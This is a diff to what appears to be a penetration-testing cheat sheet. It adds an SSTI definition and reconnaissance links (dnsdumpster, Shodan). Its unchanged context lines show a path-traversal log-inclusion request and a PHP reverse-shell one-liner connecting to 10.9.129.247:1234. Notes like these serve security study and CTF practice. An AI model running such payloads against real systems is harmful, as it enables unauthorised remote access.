@@ -342,6 +342,7 @@ GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apa
 php -r '$sock=fsockopen("10.9.129.247",1234);exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 ## SSTI
+Server-Side Template Injection
 ![SSTI](images/ssti.png)
 
 ## Websites
@@ -352,6 +353,8 @@ php -r '$sock=fsockopen("10.9.129.247",1234);exec("/bin/sh -i <&3 >&3 2>&3");
 * https://hashes.com/en/decrypt/hash
 * https://md5decrypt.net/en/
 * https://github.com/swisskyrepo/PayloadsAllTheThings
+* https://dnsdumpster.com
+* https://www.shodan.io
 
 
 
